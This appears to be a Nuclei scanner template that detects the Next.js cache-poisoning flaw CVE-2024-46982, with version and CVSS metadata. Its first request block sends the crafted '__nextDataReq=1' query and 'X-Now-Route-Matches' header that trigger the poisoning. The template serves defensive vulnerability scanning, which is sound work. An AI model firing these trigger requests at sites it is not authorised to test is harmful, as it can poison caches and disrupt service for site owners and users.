id: CVE-2024-46982-nextjs-cache-poisoning

info:
  name: Next.js Cache Poisoning (CVE-2024-46982)
  author: padsalatushal
  severity: high
  description: |
    Next.js is vulnerable to cache poisoning where crafted HTTP requests can poison the cache of
    non-dynamic server-side rendered routes in the pages router. This can coerce Next.js to cache
    routes that are meant to not be cached and send a Cache-Control: s-maxage=1, stale-while-revalidate
    header which some upstream CDNs may cache as well.

    Affected versions: Next.js >=13.5.1 and <14.2.10
    Patched versions: 13.5.7, 14.2.10 and later

    To be potentially affected all of the following must apply:
    - Next.js between 13.5.1 and 14.2.9
    - Using pages router
    - Using non-dynamic server-side rendered routes (e.g., pages/dashboard.tsx not pages/blog/[slug].tsx)
  reference:
    - https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9
    - https://nvd.nist.gov/vuln/detail/CVE-2024-46982
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-345
  metadata:
    verified: true
    max-request: 2
    vendor: vercel
    product: nextjs
    affected-versions: ">=13.5.1,<14.2.10"
    patched-versions: "13.5.7,14.2.10"
  tags: nextjs,cache-poisoning,cve,cve-2024-46982

http:
  # trigger request: induce Next.js to emit CDN-cacheable response
  - method: GET
    path:
      - "{{BaseURL}}/?__nextDataReq=1"
      - "{{BaseURL}}/index?__nextDataReq=1"
      - "{{BaseURL}}/dashboard?__nextDataReq=1"
    headers:
      X-Now-Route-Matches: 1

    max-redirects: 2
    matchers:
      - type: status
        status:
          - 200
          - 304

  # validation request: confirm cache-poisoning indicators
  - method: GET
    path:
      - "{{BaseURL}}/?__nextDataReq=1"
      - "{{BaseURL}}/index?__nextDataReq=1"
      - "{{BaseURL}}/dashboard?__nextDataReq=1"
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Cache-Control: s-maxage=1, stale-while-revalidate"

      - type: word
        part: body
        words:
          - "__NEXT_DATA__"
